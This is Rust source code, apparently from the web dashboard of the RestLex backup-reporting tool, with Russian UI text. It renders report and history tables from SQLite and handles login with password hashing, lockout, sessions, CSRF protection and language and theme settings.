const COLGROUP_H: &str = "<colgroup><col class=c-profile><col class=c-host><col class=c-status><col class=c-time><col class=c-dur><col class=c-added><col class=c-src><col class=c-files><col class=c-snap><col class=c-ver><col class=c-group><col class=c-action-h></colgroup>";
const TH: &str = r#"<tr><th class="sortable" data-col="profile" onclick="sortBy(this,'str')">Профиль</th><th class="sortable" data-col="host" onclick="sortBy(this,'str')">Хост</th><th class="sortable" data-col="status" onclick="sortBy(this,'str')">Статус</th><th class="sortable" data-col="time" onclick="sortBy(this,'num')">Начало</th><th class="sortable" data-col="dur" onclick="sortBy(this,'num')">Длит.</th><th>Добавлено</th><th class="sortable" data-col="src" onclick="sortBy(this,'num')">Источник</th><th>Файлов</th><th class="sortable" data-col="stale" onclick="sortBy(this,'num')">Свежесть</th><th class="sortable" data-col="ver" onclick="sortBy(this,'str')">Launcher/Service</th><th></th></tr>"#;
const TH_HIST: &str = r#"<tr><th class="sortable" data-col="profile" onclick="sortBy(this,'str')">Профиль</th><th class="sortable" data-col="host" onclick="sortBy(this,'str')">Хост</th><th class="sortable" data-col="status" onclick="sortBy(this,'str')">Статус</th><th class="sortable" data-col="time" onclick="sortBy(this,'num')">Начало</th><th class="sortable" data-col="dur" onclick="sortBy(this,'num')">Длит.</th><th>Добавлено</th><th class="sortable" data-col="src" onclick="sortBy(this,'num')">Источник</th><th>Файлов</th><th class="sortable" data-col="stale" onclick="sortBy(this,'num')">Свежесть</th><th class="sortable" data-col="ver" onclick="sortBy(this,'str')">Launcher/Service</th><th>Группа</th><th></th></tr>"#;


/// `csrf` = Some(токен) только для админа: он же служит признаком «показывать
/// кнопки удаления» и кладётся скрытым полем в формы.
fn report_row_ext(lang: Lang, r: &ReportRow, show_group: bool, stale_hours: f64, csrf: Option<&str>, in_history: bool) -> String {
    let is_admin = csrf.is_some();
    let csrf_in = csrf.map(csrf_field).unwrap_or_default();
    let ts_raw = r.started_at.as_deref().filter(|s| !s.is_empty()).unwrap_or(&r.received_at);
    let ts = fmt_ts(ts_raw);
    let stale_cell = fmt_stale(lang, ts_raw, stale_hours);
    let stale_style = if stale_cell.starts_with('⚠') { r#" style="color:#dc2626;font-weight:600""# } else { "" };
    let del_row_btn = if is_admin {
        format!(r#"<form method=post action="/admin/reports/{}/delete" style="display:inline;margin-left:2px">{csrf_in}<button class="btn btn-sm" style="color:#dc2626;border-color:#fca5a5;padding:1px 5px" title="{}" data-confirm="{}">🗑</button></form>"#,
            r.id, t(lang, "Удалить эту запись"), t(lang, "Удалить запись?"))
    } else { String::new() };
    let hist = if in_history {
        del_row_btn.clone()
    } else {
        format!(r#"<div class="report-actions"><a class="btn btn-sm" href="/history/{}">{}</a></div>"#, url_enc(&r.profile), t(lang, "История"))
    };
    let grp_cell = if show_group {
        format!(r#"<td><span class="badge" style="background:#f1f5f9;color:#64748b;font-weight:500">{}</span></td>"#,
            esc(r.group_name.as_deref().unwrap_or("—")))
    } else { String::new() };
    let added_cell = format!(r#"<span style="color:#1e3a5f">+{}</span>"#, fmt_bytes(lang, r.bytes_added));
    let src_cell = if r.total_bytes_processed > 0 {
        format!(r#"<span style="color:#64748b">{}</span>"#, fmt_bytes(lang, r.total_bytes_processed))
    } else {
        "—".to_string()
    };
    let files_cell = {
        let has_new = r.files_new > 0;
        let has_chg = r.files_changed > 0;
        if has_new && has_chg {
            format!(r#"<span style="color:#15803d">{}</span> <span style="color:#b45309;font-size:.85em">+{}</span>"#,
                r.files_new, r.files_changed)
        } else if has_new {
            format!(r#"<span style="color:#15803d">{}</span>"#, r.files_new)
        } else if has_chg {
            format!(r#"<span style="color:#b45309">{}</span>"#, r.files_changed)
        } else {
            "—".to_string()
        }
    };
    let lv = r.launcher_version.as_deref().unwrap_or("").trim();
    let av = r.agent_version.as_deref().unwrap_or("").trim();
    let ver = match (lv.is_empty(), av.is_empty()) {
        (true, true)   => String::new(),
        (false, true)  => lv.to_string(),
        (true, false)  => av.to_string(),
        (false, false) => format!("{}/{}", lv, av),
    };
    // Mismatch detection: highlight row yellow if profile's reported
    // launcher/agent differs from currently released pair.
    // Skip Mini-* (separate product, different version scheme).
    let is_mini = lv.starts_with("Mini") || av.starts_with("Mini");
    let version_mismatch = if is_mini || ver.is_empty() {
        false
    } else {
        let (rel_gui, rel_agent) = released_versions();
        let lv_ok = lv.is_empty() || lv == rel_gui || rel_gui == "?";
        let av_ok = av.is_empty() || av == rel_agent || rel_agent == "?";
        !(lv_ok && av_ok)
    };
    let ver_cell = if ver.is_empty() {
        "—".to_string()
    } else if version_mismatch {
        format!(r#"<span style="background:#fef08a;color:#854d0e;font-weight:600;font-size:.78rem;padding:1px 6px;border-radius:4px" title="{}">{}</span>"#, t(lang, "Версия отличается от опубликованной"), esc(&ver))
    } else {
        format!(r#"<span style="color:#64748b;font-size:.78rem">{}</span>"#, esc(&ver))
    };
    let ts_num = ts_raw.replace(['-', ':', 'T', ' ', '.'], "");
    let stale_num: i64 = {
        // negative = already stale (sort to top); positive = remaining seconds
        let ts_head: String = ts_raw.chars().take(19).collect();
        let dt = chrono::DateTime::parse_from_rfc3339(ts_raw)
            .map(|d| d.with_timezone(&chrono::Local)).ok()
            .or_else(|| chrono::NaiveDateTime::parse_from_str(&ts_head, "%Y-%m-%dT%H:%M:%S")
                .ok().and_then(naive_to_local));
        if let Some(t) = dt {
            let age = (chrono::Local::now() - t).num_seconds();
            (stale_hours * 3600.0) as i64 - age
        } else { 0 }
    };
    format!(
        r#"<tr data-status="{st}" data-profile="{p}" data-host="{h_attr}" data-time="{tsn}" data-ts="{ts_raw}" data-dur="{dur_n}" data-src="{src_n}" data-stale="{stale_n}" data-ver="{ver_attr}"><td title="{p}">{p}</td><td>{h}</td><td>{bdg}</td><td style="white-space:nowrap">{ts}</td><td>{dur}</td><td>{added}</td><td>{src}</td><td>{files}</td><td{ss}>{stale}</td><td>{ver}</td>{grp}<td class="action-cell">{hist}</td></tr>"#,
        st    = esc(&r.status),
        p     = esc(&r.profile),
        h     = esc(r.host.as_deref().unwrap_or("—")),
        h_attr = esc(r.host.as_deref().unwrap_or("")),
        tsn   = ts_num,
        ts_raw = esc(ts_raw),
        dur_n = r.duration_s,
        src_n = r.total_bytes_processed,
        stale_n = stale_num,
        ver_attr = esc(&ver),
        bdg   = badge(lang, &r.status, r.errors.as_deref().unwrap_or("[]")),
        dur   = fmt_dur(lang, r.duration_s),
        added = added_cell,
        src   = src_cell,
        files = files_cell,
        ss    = stale_style,
        stale = stale_cell,
        ver   = ver_cell,
        grp   = grp_cell,
    )
}

struct ReportRow {
    id:                    i64,
    profile:               String,
    host:                  Option<String>,
    status:                String,
    started_at:            Option<String>,
    received_at:           String,
    duration_s:            i64,
    bytes_added:           i64,
    files_new:             i64,
    files_changed:         i64,
    total_bytes_processed: i64,
    snapshot_id:           Option<String>,
    errors:                Option<String>,
    group_name:            Option<String>,
    agent_version:         Option<String>,
    launcher_version:      Option<String>,
}

fn query_latest(db: &Connection) -> Vec<ReportRow> {
    let sql = "SELECT r.id, r.profile, r.host, r.status, r.started_at, r.received_at, r.duration_s, r.bytes_added, r.files_new, r.files_changed, r.total_bytes_processed, r.snapshot_id, r.errors, g.name AS group_name, r.agent_version, r.launcher_version
        FROM reports r LEFT JOIN groups g ON r.group_id = g.id
        WHERE r.id IN (SELECT MAX(id) FROM reports GROUP BY profile)
        ORDER BY g.sort_order, g.name NULLS LAST, r.profile";
    let mut rows: Vec<ReportRow> = db.prepare(sql).ok().map(|mut s| s.query_map([], row_mapper).ok().map(|r| r.flatten().collect()).unwrap_or_default()).unwrap_or_default();
    // Версия в отчёте — на момент запуска бэкапа (раз в сутки), поэтому в «последних» показываем
    // живую версию хоста из host_info. Mini/скрипты (нечисловая версия) и неизвестные хосты не трогаем.
    let hosts = host_info_map(db);
    for r in &mut rows {
        let numeric = r.agent_version.as_deref().map_or(true, |a| a.trim().is_empty() || a.trim().starts_with(|c: char| c.is_ascii_digit()));
        if !numeric { continue; }
        if let Some((g, a)) = r.host.as_deref().and_then(|h| hosts.get(h)) {
            if !g.is_empty() && !a.is_empty() { r.launcher_version = Some(g.clone()); r.agent_version = Some(a.clone()); }
        }
    }
    rows
}

fn query_history(db: &Connection, profile: &str, limit: usize) -> Vec<ReportRow> {
    let sql = "SELECT r.id, r.profile, r.host, r.status, r.started_at, r.received_at, r.duration_s, r.bytes_added, r.files_new, r.files_changed, r.total_bytes_processed, r.snapshot_id, r.errors, g.name AS group_name, r.agent_version, r.launcher_version
        FROM reports r LEFT JOIN groups g ON r.group_id = g.id
        WHERE r.profile = ?1 ORDER BY r.received_at DESC LIMIT ?2";
    db.prepare(sql).ok().map(|mut s| s.query_map(params![profile, limit as i64], row_mapper).ok().map(|r| r.flatten().collect()).unwrap_or_default()).unwrap_or_default()
}

fn row_mapper(r: &rusqlite::Row) -> rusqlite::Result<ReportRow> {
    Ok(ReportRow {
        id:                    r.get(0)?,
        profile:               r.get(1)?,
        host:                  r.get(2)?,
        status:                r.get::<_,Option<String>>(3)?.unwrap_or_default(),
        started_at:            r.get(4)?,
        received_at:           r.get::<_,Option<String>>(5)?.unwrap_or_default(),
        duration_s:            r.get::<_,Option<i64>>(6)?.unwrap_or(0),
        bytes_added:           r.get::<_,Option<i64>>(7)?.unwrap_or(0),
        files_new:             r.get::<_,Option<i64>>(8)?.unwrap_or(0),
        files_changed:         r.get::<_,Option<i64>>(9)?.unwrap_or(0),
        total_bytes_processed: r.get::<_,Option<i64>>(10)?.unwrap_or(0),
        snapshot_id:           r.get(11)?,
        errors:                r.get(12)?,
        group_name:            r.get(13)?,
        agent_version:         r.get(14)?,
        launcher_version:      r.get(15)?,
    })
}

// ── Route handlers ────────────────────────────────────────────────────────────

static FAVICON: &[u8] = include_bytes!("../../../../icon.ico");

async fn favicon(_st: State<AppState>) -> impl IntoResponse {
    Response::builder()
        .header(header::CONTENT_TYPE, "image/x-icon")
        .body(axum::body::Body::from(FAVICON))
        .unwrap()
}

fn render_login(lang: Lang, err: &str) -> Html<String> {
    let err_html = if err.is_empty() { String::new() }
        else { format!(r#"<div class="login-err">{}</div>"#, esc(err)) };
    Html(fill(t(lang, r#"<!doctype html><html lang=ru><head><meta charset=utf-8><title>RestLex — Вход</title>{CSS}</head><body>
<div class="login-wrap"><div class="login-box">
<div style="text-align:right;font-size:.8rem;margin-bottom:6px">{lang_switch}</div>
<h2>&#x1f6e1; RestLex — вход</h2>
{err_html}
<form method=post><input name=username placeholder=Логин autocomplete=username>
<input name=password type=password placeholder=Пароль autocomplete=current-password>
<button type=submit>Войти</button></form></div></div></body></html>"#),
        &[("CSS", CSS), ("lang_switch", &lang_switch(lang, "")), ("err_html", &err_html)]))
}

async fn login_get(State(_st): State<AppState>, headers: HeaderMap) -> Html<String> {
    render_login(Lang::from_headers(&headers), "")
}

/// GET /lang/{ru|en}: запоминает язык в cookie и возвращает на страницу, с
/// которой пришли (Referer того же хоста), иначе на `/`.
async fn set_lang(State(st): State<AppState>, headers: HeaderMap, Path(code): Path<String>) -> Response {
    let Some(lang) = Lang::parse(&code) else { return StatusCode::NOT_FOUND.into_response() };
    let secure = st.cfg().behind_tls;
    let back = lang_back(&headers);
    Response::builder()
        .status(StatusCode::SEE_OTHER)
        .header(header::LOCATION, back)
        .header(header::SET_COOKIE, lang.cookie(secure))
        .body(axum::body::Body::empty())
        .unwrap()
}

/// Путь возврата для переключателя языка. Referer браузеры шлют абсолютным
/// URL, поэтому принимаем его, только если хост совпадает с Host запроса;
/// дальше — те же правила, что и в `safe_back` (никаких open redirect).
fn lang_back(headers: &HeaderMap) -> String {
    let Some(r) = headers.get(header::REFERER).and_then(|v| v.to_str().ok()) else { return "/".into() };
    let path = match r.strip_prefix("http://").or_else(|| r.strip_prefix("https://")) {
        Some(rest) => {
            let (authority, path) = rest.find('/').map_or((rest, "/"), |i| (&rest[..i], &rest[i..]));
            let host = headers.get(header::HOST).and_then(|v| v.to_str().ok()).unwrap_or("");
            if host.is_empty() || !authority.eq_ignore_ascii_case(host) { return "/".into(); }
            path
        }
        None => r,
    };
    if is_safe_redirect(path) && !path.starts_with("/lang/") { path.to_string() } else { "/".into() }
}

#[derive(Deserialize)]
struct LoginForm { username: String, password: String }

async fn login_post(
    State(st): State<AppState>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    headers: HeaderMap,
    Form(form): Form<LoginForm>,
) -> Response {
    let cfg = st.cfg();
    let ip = client_ip(&headers, &addr);
    let now = now_unix();
    let lang = Lang::from_headers(&headers);

    // Локаут: проверяем блокировку IP ДО сверки пароля.
    if cfg.lockout_max_attempts > 0 {
        let remaining = lock_remaining(&st, &ip, now);
        if remaining > 0 {
            let mins = (remaining + 59) / 60;
            return render_login(lang, &fill(t(lang,
                "Слишком много неудачных попыток. Вход с вашего IP заблокирован ещё на ~{mins} мин."
            ), &[("mins", &mins.to_string())])).into_response();
        }
    }

    // Ограничитель конкуренции: KDF считается только если есть свободный слот,
    // иначе 429 БЕЗ выполнения KDF. Пермит держим до конца обеих веток проверки.
    let Ok(_gate) = st.login_gate.clone().try_acquire_owned() else {
        return (
            StatusCode::TOO_MANY_REQUESTS,
            [(header::RETRY_AFTER, "5")],
            render_login(lang, t(lang, "Сервер занят проверкой паролей. Повторите через несколько секунд.")),
        ).into_response();
    };

    // Try users table first.
    // PBKDF2 (200k итераций, при миграции легаси-хеша — ещё и hash_password)
    // считается сотни миллисекунд. В async-хендлере это блокировало воркер
    // tokio на каждый POST /login: при выключенном локауте неаутентифицированный
    // запрос становился дешёвым CPU-DoS, кладущим и приём отчётов.
    let mut role: Option<String> = None;
    let mut matched_username: Option<String> = None;
    let mut verified_db_credential: Option<(String, String)> = None;
    {
        let st2 = st.clone();
        let user = form.username.clone();
        let pass = form.password.clone();
        let checked = tokio::task::spawn_blocking(move || -> Option<(String, String)> {
            let db = st2.db().ok()?;
            let (stored, r): (String, String) = db.query_row(
                "SELECT password,role FROM users WHERE username=?1",
                params![user],
                |r| Ok((r.get::<_,String>(0)?, r.get::<_,String>(1)?)),
            ).ok()?;
            if !verify_password(&pass, &stored) { return None; }
            // Миграция старого одно-раундового SHA-256 на PBKDF2 — «на входе»,
            // иначе существующие пользователи потеряли бы доступ.
            let verified_hash = if needs_rehash(&stored) {
                let upgraded = hash_password(&pass);
                if !upgrade_password_if_unchanged(&db, &user, &stored, &upgraded) { return None; }
                upgraded
            } else { stored };
            Some((r, verified_hash))
        }).await.unwrap_or_else(|e| {
            tracing::error!("login task failed: {e}");
            None
        });
        if let Some((r, verified_hash)) = checked {
            role = Some(r);
            matched_username = Some(form.username.clone());
            verified_db_credential = Some((verified_hash, role.as_ref().unwrap().clone()));
        }
    }
    // Fallback to config-based auth (backward compat)
    if role.is_none() {
        // Пустой admin_password НЕ должен пускать: иначе конфиг без этого поля
        // (или не прочитанный) открывает вход кому угодно.
        let ok_admin = !cfg.admin_password.is_empty()
            && !restlex_core::crypto::is_undecrypted(&cfg.admin_password)
            && hmac_eq(form.username.as_bytes(), cfg.admin_user.as_bytes())
            && hmac_eq(form.password.as_bytes(), cfg.admin_password.as_bytes());
        let ok_viewer = !cfg.viewer_password.is_empty()
            && !restlex_core::crypto::is_undecrypted(&cfg.viewer_password)
            && hmac_eq(form.password.as_bytes(), cfg.viewer_password.as_bytes());
        if ok_admin {
            role = Some("admin".into());
            matched_username = Some(cfg.admin_user.clone());
        } else if ok_viewer {
            role = Some("viewer".into());
            matched_username = Some("viewer".into());
        }
    }
    if let Some(role) = role {
        // Успешный вход — снимаем счётчик неудач для этого IP.
        st.lockouts.lock().unwrap().remove(&ip);
        let token = new_session_token();
        let entry = SessionEntry {
            role: role.to_string(),
            username: matched_username.unwrap_or_default(),
            csrf: new_session_token(),
            created: now,
            last_seen: now,
        };
        let session_st = st.clone();
        let session_token = token.clone();
        let session_entry = entry.clone();
        let credential = verified_db_credential;
        let saved = tokio::task::spawn_blocking(move || -> bool {
            let _gate = session_st.session_gate.lock().unwrap();
            if let Some((expected_hash, expected_role)) = credential {
                let Ok(users_db) = session_st.db() else { return false };
                if !db_credential_unchanged(&users_db, &session_entry.username, &expected_hash, &expected_role) {
                    return false;
                }
            }
            let Ok(db) = session_st.session_db() else { return false };
            db.execute("DELETE FROM web_sessions WHERE last_seen<=?1", params![now - SESSION_TTL_SECS]).is_ok()
                && persist_session(&db, &session_token, &session_entry).is_ok()
        }).await.unwrap_or(false);
        if !saved {
            return StatusCode::INTERNAL_SERVER_ERROR.into_response();
        }
        {
            let mut m = st.sessions.lock().unwrap();
            // Чистка протухших + потолок размера: иначе карта росла до OOM.
            m.retain(|_, e| !session_expired(e, now));
            while m.len() >= MAX_SESSIONS {
                let Some(oldest) = m.iter().min_by_key(|(_, e)| e.last_seen).map(|(k, _)| k.clone())
                    else { break };
                m.remove(&oldest);
            }
            m.insert(token.clone(), entry);
        }
        Response::builder()
            .status(302)
            .header(header::LOCATION, "/")
            .header(header::SET_COOKIE, set_session_cookie(&token, cfg.behind_tls, SESSION_TTL_SECS))
            .body(axum::body::Body::empty()).unwrap()
    } else {
        register_login_fail(&st, &ip, &form.username, &cfg, now);
        render_login(lang, t(lang, "Неверный логин или пароль")).into_response()
    }
}

fn hmac_eq(a: &[u8], b: &[u8]) -> bool {
    type HmacSha256 = Hmac<Sha256>;
    let mut mac_a = HmacSha256::new_from_slice(b"restlex").unwrap();
    let mut mac_b = HmacSha256::new_from_slice(b"restlex").unwrap();
    mac_a.update(a);
    mac_b.update(b);
    mac_a.finalize().into_bytes() == mac_b.finalize().into_bytes()
}

async fn logout(State(st): State<AppState>, headers: HeaderMap) -> Response {
    if let Some(token) = get_session_token(&headers) {
        let revoked = tokio::task::spawn_blocking(move || {
            // Сериализуем отзыв с load_session_entry: после DELETE токен нельзя
            // восстановить из старого результата SELECT.
            let _gate = st.session_gate.lock().unwrap();
            if let Ok(db) = st.session_db() {
                if db.execute("DELETE FROM web_sessions WHERE token_hash=?1", params![session_token_hash(&token)]).is_err() {
                    return false;
                }
            } else {
                return false;
            }
            st.sessions.lock().unwrap().remove(&token);
            true
        }).await.unwrap_or(false);
        if !revoked { return StatusCode::SERVICE_UNAVAILABLE.into_response(); }
    }
    Response::builder()
        .status(302)
        .header(header::LOCATION, "/login")
        .header(header::SET_COOKIE, clear_session_cookie())
        .body(axum::body::Body::empty()).unwrap()
}

async fn require_viewer_redirect(state: &AppState, headers: &HeaderMap, path: &str) -> Option<Response> {
    // Always require auth: viewer-cookie OR admin-cookie.
    // Empty viewer_password is NOT a bypass — falls back to admin-only viewing.
    if is_viewer(state, headers) || is_admin(state, headers) {
        None
    } else {
        Some(Redirect::to(&format!("/login?next={}", url_enc(path))).into_response())
    }
}

async fn require_admin_redirect(state: &AppState, headers: &HeaderMap) -> Option<Response> {
    if is_admin(state, headers) { None }
    else { Some(Redirect::to("/login?next=/admin").into_response()) }
}

/// Рендер страницы UI — чтения SQLite блокирующие и под busy_timeout=5с могут
/// держать async-воркер tokio (приём отчётов уже унесён в spawn_blocking,
/// см. receive_report). Здесь то же самое для UI-страниц.
async fn blocking_page<F>(f: F) -> Response
where
    F: FnOnce() -> Response + Send + 'static,
{
    tokio::task::spawn_blocking(f).await.unwrap_or_else(|e| {
        tracing::error!("render task failed: {e}");
        (StatusCode::INTERNAL_SERVER_ERROR, Html("<p>Internal error</p>".to_string())).into_response()
    })
}

async fn index(State(st): State<AppState>, headers: HeaderMap) -> Response {
    if let Some(r) = require_viewer_redirect(&st, &headers, "/").await { return r; }
    let admin = is_admin(&st, &headers);
    let csrf = csrf_token(&st, &headers);
    let username = current_username(&st, &headers).unwrap_or_default();
    let stale_h = st.cfg().stale_hours;
    let lang = Lang::from_headers(&headers);
    blocking_page(move || index_html(lang, &st, admin, &csrf, stale_h, &username)).await
}

#[derive(Deserialize)]
struct GroupStateForm { csrf: Option<String>, collapsed: String }

#[derive(Deserialize)]
struct ThemeForm { csrf: Option<String>, theme: String }

async fn save_theme(State(st): State<AppState>, headers: HeaderMap, Form(form): Form<ThemeForm>) -> Response {
    if !is_viewer(&st, &headers) { return StatusCode::UNAUTHORIZED.into_response(); }
    if !csrf_ok(&st, &headers, form.csrf.as_deref()) { return csrf_reject(); }
    if form.theme != "light" && form.theme != "graphite" { return StatusCode::BAD_REQUEST.into_response(); }
    let Some(username) = current_username(&st, &headers) else { return StatusCode::UNAUTHORIZED.into_response() };
    blocking_page(move || {
        let Ok(db) = st.db() else { return StatusCode::INTERNAL_SERVER_ERROR.into_response() };
        match store_theme(&db, &username, &form.theme) {
            Ok(()) => StatusCode::NO_CONTENT.into_response(),
            Err(e) => { tracing::warn!("Не удалось сохранить тему интерфейса: {e}"); StatusCode::INTERNAL_SERVER_ERROR.into_response() },
        }
    }).await
}

async fn save_group_state(State(st): State<AppState>, headers: HeaderMap, Form(form): Form<GroupStateForm>) -> Response {
    if !is_viewer(&st, &headers) { return StatusCode::UNAUTHORIZED.into_response(); }
    if !csrf_ok(&st, &headers, form.csrf.as_deref()) { return csrf_reject(); }
    let Some(username) = current_username(&st, &headers) else { return StatusCode::UNAUTHORIZED.into_response() };
    if form.collapsed.len() > 65536 { return StatusCode::BAD_REQUEST.into_response(); }
    let Ok(groups) = serde_json::from_str::<Vec<String>>(&form.collapsed) else { return StatusCode::BAD_REQUEST.into_response() };
    if groups.len() > 1000 || groups.iter().any(|g| g.len() > 512 || !(g == "ungrouped" || g.starts_with("org:"))) {
        return StatusCode::BAD_REQUEST.into_response();
    }
    blocking_page(move || {
        let Ok(db) = st.db() else { return StatusCode::INTERNAL_SERVER_ERROR.into_response() };
        match store_collapsed_groups(&db, &username, &groups) {
            Ok(()) => StatusCode::NO_CONTENT.into_response(),
            Err(e) => { tracing::warn!("Не удалось сохранить свёрнутые группы: {e}"); StatusCode::INTERNAL_SERVER_ERROR.into_response() },
        }
    }).await
}

fn index_html(lang: Lang, st: &AppState, admin: bool, csrf: &str, stale_h: f64, username: &str) -> Response {
    let th = t(lang, TH);
    let admin_csrf = if admin { Some(csrf) } else { None };
    let Ok(db) = st.db() else { return Html("<p>DB error</p>".to_string()).into_response() };
    let rows = query_latest(&db);
    let collapsed = load_collapsed_groups(&db, username);
    let theme = load_theme(&db, username);

    let mut grouped: HashMap<String, Vec<&ReportRow>> = HashMap::new();
    let mut ungrouped: Vec<&ReportRow> = Vec::new();
    for r in &rows {
        if let Some(ref gn) = r.group_name { grouped.entry(gn.clone()).or_default().push(r); }
        else { ungrouped.push(r); }
    }
    let mut body = String::new();
    let mut group_names: Vec<String> = grouped.keys().cloned().collect();
    group_names.sort();
    for gname in &group_names {
        let key = format!("org:{gname}");
        let is_collapsed = collapsed.contains(&key);
        body.push_str(&format!(r#"<div class="group{class}" data-group-key="{key}"><div class="group-hdr"><h2><button type=button class=group-toggle aria-expanded="{expanded}" onclick="toggleGroup(this)">&#x1f4c1; {name}</button></h2><span class=group-problems hidden></span></div><div class=tbl-wrap><table class=report-table>{COLGROUP}{th}<tbody>"#,
            class = if is_collapsed { " collapsed" } else { "" }, key = esc(&key),
            expanded = !is_collapsed, name = esc(gname)));
        for r in &grouped[gname] { body.push_str(&report_row_ext(lang, r, false, stale_h, admin_csrf, false)); }
        body.push_str("</tbody></table></div></div>");
    }
    if !ungrouped.is_empty() {
        let is_collapsed = collapsed.contains("ungrouped");
        body.push_str(&format!(r#"<div class="group{class}" data-group-key="ungrouped"><div class="group-hdr gray"><h2><button type=button class=group-toggle aria-expanded="{expanded}" onclick="toggleGroup(this)">&#x1f4c2; {ungrouped}</button></h2><span class=group-problems hidden></span></div><div class=tbl-wrap><table class=report-table>{COLGROUP}{th}<tbody>"#,
            class = if is_collapsed { " collapsed" } else { "" }, expanded = !is_collapsed, ungrouped = t(lang, "Без группы")));
        for r in &ungrouped { body.push_str(&report_row_ext(lang, r, false, stale_h, admin_csrf, false)); }
        body.push_str("</tbody></table></div></div>");
    }
    if body.is_empty() { body = t(lang, r#"<p style="color:#64748b;padding:30px 0">Нет данных. Настройте report_url в профилях RestLex.</p>"#).into(); }
    let filter_btns = t(lang, r#"<div class="filter-strip" id="report-filters" aria-label="Фильтры отчётов">
<span class="filter-strip-label">Показать:</span>
<button class="filter-chip" data-mode="all" onclick="setReportFilter('all')">Все</button>
<button class="filter-chip" data-mode="problems" onclick="setReportFilter('problems')" title="Ошибки, прерванные и просроченные бэкапы">Проблемные</button>
<button class="filter-chip" data-mode="errors" onclick="setReportFilter('errors')">Ошибки</button>
<button class="filter-chip" data-mode="stale" onclick="setReportFilter('stale')">Просроченные</button>
<button class="filter-chip" data-mode="oldest" onclick="setReportFilter('oldest')" title="Десять профилей с самой старой копией">Самые старые · 10</button>
<button class="filter-chip" data-mode="ungrouped" onclick="setReportFilter('ungrouped')">Без группы</button>
<button class="filter-chip filter-collapse" id="toggle-all-groups" onclick="toggleAllGroups()">Свернуть группы</button>
 <span class="filter-meta"><span class="filter-count" id="filter-count"></span><span class="filter-updated" id="panel-updated-at" aria-live="off"></span></span></div>"#);
    Html(fill(t(lang, r#"<!doctype html><html lang=ru><head><meta charset=utf-8><title>RestLex — Отчёты</title>{CSS}</head><body class="theme-{theme}" data-dash="1" data-stale-hours="{sh}" data-agent-ver="{av}" data-group-csrf="{group_csrf}">
 {nav}
<div class=container>
{body}
</div>{JS_BLOCK}</body></html>"#), &[
        ("CSS", CSS),
        ("theme", theme),
        ("nav", &nav(lang, admin, "", filter_btns, count_update_errors(&db, username), theme, csrf)),
        ("sh", &stale_h.to_string()),
        ("av", crate::AGENT_VERSION),
        ("group_csrf", &esc(csrf)),
        ("body", &body),
        ("JS_BLOCK", t(lang, JS_BLOCK)),
    ])).into_response()
}

async fn history(State(st): State<AppState>, headers: HeaderMap, Path(profile): Path<String>) -> Response {
    if let Some(r) = require_viewer_redirect(&st, &headers, &format!("/history/{}", url_enc(&profile))).await { return r; }
    let admin = is_admin(&st, &headers);
    let csrf = csrf_token(&st, &headers);
    let username = current_username(&st, &headers).unwrap_or_default();
    let lang = Lang::from_headers(&headers);
    blocking_page(move || history_html(lang, &st, admin, &csrf, &profile, &username)).await
}

fn profile_delete_form(lang: Lang, profile: &str, csrf: &str) -> String {
    fill(t(lang, r##"<form method=post action="/admin/profiles/{url}/delete">{csrf}<button type=submit class="btn action-delete-all" title="Удалить всю историю этого бэкапа" data-confirm="Удалить ВСЮ историю бэкапа «{p}»?">🗑 Удалить всё</button></form>"##),
        &[("url", &url_enc(profile)), ("csrf", &csrf_field(csrf)), ("p", &esc(profile))])
}

fn history_html(lang: Lang, st: &AppState, admin: bool, csrf: &str, profile: &str, username: &str) -> Response {
    let admin_csrf = if admin { Some(csrf) } else { None };
    let cfg = st.cfg();
    let lim = cfg.history_count;
    let stale_h = cfg.stale_hours;
    let Ok(db) = st.db() else { return Html("<p>DB error</p>".to_string()).into_response() };
    let theme = load_theme(&db, username);
    let rows = query_history(&db, profile, lim);
    let delete_all = if admin && !rows.is_empty() { profile_delete_form(lang, profile, csrf) } else { String::new() };
    let mut tbl = format!("<table class=report-table>{COLGROUP_H}{}<tbody>", t(lang, TH_HIST));
    for r in &rows { tbl.push_str(&report_row_ext(lang, r, true, stale_h, admin_csrf, true)); }
    tbl.push_str("</tbody></table>");
    Html(fill(t(lang, r#"<!doctype html><html lang=ru><head><meta charset=utf-8><title>История — {p}</title>{CSS}</head><body class="theme-{theme}">
{nav}
<div class=container>
<a class="nav-back" href="/">&#x2190; Назад к отчётам</a>
 <div class="history-heading"><div class="page-title">&#x1f4cb; История: {p}</div>{delete_all}</div>
<p style="color:var(--gray);font-size:.83rem;margin-bottom:12px">Последние {lim} бэкапов</p>
<div class=group><div class=tbl-wrap>{tbl}</div></div>
 </div>{JS_BLOCK}</body></html>"#), &[
        ("p", &esc(profile)),
        ("CSS", CSS),
        ("theme", theme),
        ("nav", &nav(lang, admin, "", "", count_update_errors(&db, username), theme, csrf)),
        ("delete_all", &delete_all),
        ("lim", &lim.to_string()),
        ("tbl", &tbl),
        ("JS_BLOCK", t(lang, JS_BLOCK)),
    ])).into_response()
}

async fn admin_page(State(st): State<AppState>, headers: HeaderMap,
    axum::extract::Query(params): axum::extract::Query<HashMap<String, String>>) -> Response {
    if let Some(r) = require_admin_redirect(&st, &headers).await { return r; }
    let csrf = csrf_token(&st, &headers);
    let username = current_username(&st, &headers).unwrap_or_default();
    let lang = Lang::from_headers(&headers);
    blocking_page(move || admin_page_html(lang, &st, &csrf, &params, &username)).await
}

fn admin_page_html(lang: Lang, st: &AppState, csrf: &str, params: &HashMap<String, String>, username: &str) -> Response {
    let csrf_in = csrf_field(csrf);
    let fl = params.get("flash").map(String::as_str).unwrap_or("");
    let Ok(db) = st.db() else { return Html("<p>DB error</p>".to_string()).into_response() };
    let theme = load_theme(&db, username);

    let groups: Vec<(i64,String,String,i64,i64)> = db.prepare(
        "SELECT id,name,pattern,auto_created,sort_order FROM groups ORDER BY sort_order,name"
    ).ok().map(|mut s| s.query_map([], |r| Ok((r.get(0)?,r.get(1)?,r.get::<_,Option<String>>(2)?.unwrap_or_default(),r.get(3)?,r.get(4)?))).ok().map(|it| it.flatten().collect()).unwrap_or_default()).unwrap_or_default();

    let mut ghtml = String::new();
    for (id,name,pat,auto,ord) in &groups {
        let tp = if *auto == 1 { t(lang, "авто") } else { t(lang, "ручная") };
        ghtml.push_str(&format!(r#"<tr><td>{}</td><td><code>{}</code></td><td>{tp}</td><td>{ord}</td><td><form method=post action='/admin/groups/{id}/delete' style='display:inline'>{csrf_in}<button class='btn btn-sm' style='color:#dc2626;border-color:#fca5a5' data-confirm="{confirm}">&#x1f5d1;</button></form></td></tr>"#, esc(name), esc(pat), csrf_in = csrf_in, confirm = t(lang, "Удалить группу?")));
    }
